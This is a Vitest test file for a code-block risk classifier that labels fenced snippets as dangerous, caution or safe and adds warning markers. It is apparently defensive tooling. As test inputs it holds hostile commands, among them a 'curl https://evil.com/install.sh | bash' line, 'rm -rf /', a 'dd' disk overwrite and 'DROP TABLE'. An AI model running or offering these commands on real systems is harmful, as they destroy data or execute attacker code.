import { describe, it, expect } from 'vitest'
import { extractCodeBlocks, assessCodeRisk, sandboxWrap } from '../src/sandbox.js'
import type { CodeBlock } from '../src/sandbox.js'

// ─── extractCodeBlocks ────────────────────────────────────────────────────────

describe('extractCodeBlocks', () => {
  it('extracts a single fenced code block with language', () => {
    const text = 'Hello\n```python\nprint("hi")\n```\nWorld'
    const blocks = extractCodeBlocks(text)
    expect(blocks).toHaveLength(1)
    expect(blocks[0].language).toBe('python')
    expect(blocks[0].code).toBe('print("hi")')
  })

  it('extracts a code block with no language tag', () => {
    const text = '```\nsome code\n```'
    const blocks = extractCodeBlocks(text)
    expect(blocks).toHaveLength(1)
    expect(blocks[0].language).toBe('')
    expect(blocks[0].code).toBe('some code')
  })

  it('extracts multiple code blocks', () => {
    const text = '```bash\necho hello\n```\n\n```typescript\nconst x = 1\n```'
    const blocks = extractCodeBlocks(text)
    expect(blocks).toHaveLength(2)
    expect(blocks[0].language).toBe('bash')
    expect(blocks[1].language).toBe('typescript')
  })

  it('records correct lineStart (1-indexed, line after opening fence)', () => {
    const text = 'line1\nline2\n```js\nconsole.log(1)\n```'
    const blocks = extractCodeBlocks(text)
    expect(blocks[0].lineStart).toBe(3) // opening fence is line 3
  })

  it('handles empty code block', () => {
    const text = '```\n```'
    const blocks = extractCodeBlocks(text)
    expect(blocks).toHaveLength(1)
    expect(blocks[0].code).toBe('')
  })

  it('returns empty array when no code blocks present', () => {
    const text = 'Just some plain text.\nNo code here.'
    const blocks = extractCodeBlocks(text)
    expect(blocks).toHaveLength(0)
  })

  it('preserves multiline code content', () => {
    const text = '```python\ndef foo():\n    return 42\n```'
    const blocks = extractCodeBlocks(text)
    expect(blocks[0].code).toBe('def foo():\n    return 42')
  })
})

// ─── assessCodeRisk — dangerous ──────────────────────────────────────────────

describe('assessCodeRisk — dangerous', () => {
  const makeBlock = (code: string, language = 'bash'): CodeBlock => ({
    language,
    code,
    lineStart: 1,
    lineEnd: 3,
  })

  it('flags rm -rf as dangerous', () => {
    const result = assessCodeRisk(makeBlock('rm -rf /tmp/test'))
    expect(result.risk).toBe('dangerous')
    expect(result.reasons.length).toBeGreaterThan(0)
  })

  it('flags rm -fr as dangerous', () => {
    const result = assessCodeRisk(makeBlock('rm -fr /important'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags DROP TABLE as dangerous', () => {
    const result = assessCodeRisk(makeBlock('DROP TABLE users;', 'sql'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags curl|bash as dangerous', () => {
    const result = assessCodeRisk(makeBlock('curl https://evil.com/install.sh | bash'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags eval() as dangerous', () => {
    const result = assessCodeRisk(makeBlock('eval("__import__(\'os\').system(\'ls\')")', 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags exec() as dangerous', () => {
    const result = assessCodeRisk(makeBlock('exec("rm -f file")', 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags __import__(\'os\') as dangerous', () => {
    const result = assessCodeRisk(makeBlock("__import__('os').getcwd()", 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags subprocess as dangerous', () => {
    const result = assessCodeRisk(makeBlock('subprocess.run(["ls", "-la"])', 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags os.system() as dangerous', () => {
    const result = assessCodeRisk(makeBlock('os.system("clear")', 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags shutil.rmtree as dangerous', () => {
    const result = assessCodeRisk(makeBlock('shutil.rmtree("/var/tmp/work")', 'python'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags child_process in Node.js as dangerous', () => {
    const result = assessCodeRisk(makeBlock("const { exec } = require('child_process')", 'javascript'))
    expect(result.risk).toBe('dangerous')
  })

  it('flags dd disk overwrite as dangerous', () => {
    const result = assessCodeRisk(makeBlock('dd if=/dev/zero of=/dev/sda'))
    expect(result.risk).toBe('dangerous')
  })
})

// ─── assessCodeRisk — caution ─────────────────────────────────────────────────

describe('assessCodeRisk — caution', () => {
  const makeBlock = (code: string, language = 'python'): CodeBlock => ({
    language,
    code,
    lineStart: 1,
    lineEnd: 3,
  })

  it('flags open(file, "w") as caution', () => {
    const result = assessCodeRisk(makeBlock('with open("output.txt", "w") as f:\n    f.write(data)'))
    expect(result.risk).toBe('caution')
  })

  it('flags fetch() as caution', () => {
    const result = assessCodeRisk(makeBlock('const res = await fetch("https://api.example.com")', 'typescript'))
    expect(result.risk).toBe('caution')
  })

  it('flags requests.get as caution', () => {
    const result = assessCodeRisk(makeBlock('resp = requests.get("https://api.example.com")'))
    expect(result.risk).toBe('caution')
  })

  it('flags process.env as caution', () => {
    const result = assessCodeRisk(makeBlock('const key = process.env.API_KEY', 'typescript'))
    expect(result.risk).toBe('caution')
  })

  it('flags os.environ as caution', () => {
    const result = assessCodeRisk(makeBlock('token = os.environ["TOKEN"]'))
    expect(result.risk).toBe('caution')
  })

  it('flags fs.writeFileSync as caution', () => {
    const result = assessCodeRisk(makeBlock('fs.writeFileSync("data.json", content)', 'javascript'))
    expect(result.risk).toBe('caution')
  })

  it('flags SQL INSERT as caution', () => {
    const result = assessCodeRisk(makeBlock('INSERT INTO logs (msg) VALUES (?)', 'sql'))
    expect(result.risk).toBe('caution')
  })
})

// ─── assessCodeRisk — safe ────────────────────────────────────────────────────

describe('assessCodeRisk — safe', () => {
  const makeBlock = (code: string, language = 'python'): CodeBlock => ({
    language,
    code,
    lineStart: 1,
    lineEnd: 3,
  })

  it('marks pure arithmetic as safe', () => {
    const result = assessCodeRisk(makeBlock('x = (2 + 3) * 10\nprint(x)'))
    expect(result.risk).toBe('safe')
    expect(result.reasons).toHaveLength(0)
  })

  it('marks string manipulation as safe', () => {
    const result = assessCodeRisk(makeBlock('const s = "hello".toUpperCase()', 'typescript'))
    expect(result.risk).toBe('safe')
  })

  it('marks SELECT query as safe', () => {
    const result = assessCodeRisk(makeBlock('SELECT id, name FROM users WHERE active = 1', 'sql'))
    expect(result.risk).toBe('safe')
  })
})

// ─── sandboxWrap ──────────────────────────────────────────────────────────────

describe('sandboxWrap', () => {
  it('adds DANGEROUS marker above dangerous code blocks', () => {
    const text = '```bash\nrm -rf /tmp\n```'
    const wrapped = sandboxWrap(text)
    expect(wrapped).toContain('⚠️ DANGEROUS - DO NOT EXECUTE')
    expect(wrapped).toContain('rm -rf /tmp')
  })

  it('adds caution marker above caution code blocks', () => {
    const text = '```python\nrequests.get("https://api.example.com")\n```'
    const wrapped = sandboxWrap(text)
    expect(wrapped).toContain('⚠️ Review before executing')
  })

  it('does not add marker to safe code blocks', () => {
    const text = '```python\nx = 2 + 2\nprint(x)\n```'
    const wrapped = sandboxWrap(text)
    expect(wrapped).not.toContain('⚠️')
    expect(wrapped).toContain('x = 2 + 2')
  })

  it('preserves surrounding prose unchanged', () => {
    const text = 'Here is some code:\n```python\nx = 1\n```\nEnd of doc.'
    const wrapped = sandboxWrap(text)
    expect(wrapped).toContain('Here is some code:')
    expect(wrapped).toContain('End of doc.')
  })

  it('handles multiple blocks with mixed risk levels', () => {
    const text = [
      '```python',
      'x = 1',
      '```',
      '',
      '```bash',
      'rm -rf /',
      '```',
      '',
      '```python',
      'requests.post("https://api.io", json=data)',
      '```',
    ].join('\n')

    const wrapped = sandboxWrap(text)
    // safe block: no marker
    const lines = wrapped.split('\n')
    const dangerIdx = lines.findIndex((l) => l.includes('DANGEROUS'))
    const cautionIdx = lines.findIndex((l) => l.includes('Review before executing'))
    expect(dangerIdx).toBeGreaterThan(-1)
    expect(cautionIdx).toBeGreaterThan(-1)
    // safe block should not be preceded by a warning
    expect(wrapped.indexOf('⚠️')).toBeGreaterThan(wrapped.indexOf('x = 1'))
  })

  it('returns plain text unchanged when no code blocks present', () => {
    const text = 'Just a regular note with no code.'
    expect(sandboxWrap(text)).toBe(text)
  })
})
